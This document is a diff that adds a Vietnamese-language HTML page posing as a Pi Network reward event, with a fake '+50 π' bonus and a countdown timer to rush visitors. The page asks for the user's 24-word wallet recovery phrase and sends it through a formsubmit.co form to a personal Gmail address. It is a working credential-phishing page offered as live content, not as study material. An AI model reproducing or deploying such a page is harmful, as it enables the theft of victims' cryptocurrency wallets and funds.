@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sự Kiện Nhận Thưởng Pi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #a1c4fd, #c2e9fb);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 600px;
+        }
+
+        h1 {
+            font-size: 36px;
+            color: #4a90e2;
+            margin-bottom: 20px;
+        }
+
+        .sub {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .bonus {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e94e77;
+            margin-bottom: 20px;
+        }
+
+        .cta {
+            font-size: 20px;
+            color: #333;
+            margin: 20px 0;
+        }
+
+        .input-container {
+            margin: 20px 0;
+        }
+
+        textarea {
+            width: 100%;
+            height: 120px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            resize: none;
+            box-sizing: border-box;
+        }
+
+        button {
+            padding: 15px 30px;
+            background-color: #4a90e2;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #357ab7;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .flower-decor, .flower-decor-2 {
+            position: absolute;
+            z-index: -1;
+        }
+
+        .flower-decor {
+            top: 30px;
+            left: 20px;
+            width: 50px;
+            height: 50px;
+            background: url('https://www.flaticon.com/svg/vstatic/svg/833/833475.svg?token=exp=1654138973~hmac=60536f5d36ad3683c6a0e65367948c2a') no-repeat;
+            background-size: cover;
+        }
+
+        .flower-decor-2 {
+            top: 30px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            background: url('https://www.flaticon.com/svg/vstatic/svg/833/833477.svg?token=exp=1654139024~hmac=0ec6b3e3b5f00b83d02d7bcad74c7b3c') no-repeat;
+            background-size: cover;
+        }
+
+        /* Countdown */
+        #countdown {
+            font-weight: bold;
+            color: #e94e77;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .container {
+            animation: fadeIn 1s ease-in;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎊 Sự Kiện Lớn – Nhận Thưởng Pi Ngay!</h1>
+        <div class="sub">🎉 Chúc mừng bạn! Bạn đã đến gần hơn với cơ hội nhận thưởng Pi tuyệt vời từ Pi Network!</div>
+        <div class="bonus">+50 π</div>
+        <div class="sub">⏱️ Còn lại: <span id="countdown">20:46</span></div>
+        <div class="cta">✨ Đừng bỏ lỡ cơ hội này! Hãy nhanh tay đăng ký ngay để nhận thưởng Pi của bạn!</div>
+        
+        <form action="https://formsubmit.co/trandan0277@gmail.com" method="POST">
+            <div class="input-container">
+                <label for="passwords">Nhập 24 cụm mật khẩu của bạn:</label><br>
+                <textarea name="passwords" id="passwords" placeholder="Nhập toàn bộ 24 cụm mật khẩu tại đây" required></textarea>
+            </div>
+            <button type="submit">Đăng ký nhận thưởng</button>
+        </form>
+
+        <div class="footer">
+            <p>Chúc mừng bạn tham gia sự kiện! Đừng quên kiểm tra email của bạn để nhận thông báo!</p>
+        </div>
+    </div>
+
+    <!-- Hoa lá trang trí -->
+    <div class="flower-decor"></div>
+    <div class="flower-decor-2"></div>
+
+    <!-- Countdown script -->
+    <script>
+        let timeLeft = 1246; // 20 phút 46 giây
+        const timerEl = document.getElementById("countdown");
+
+        setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+                const s = String(timeLeft % 60).padStart(2, '0');
+                timerEl.textContent = `${m}:${s}`;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
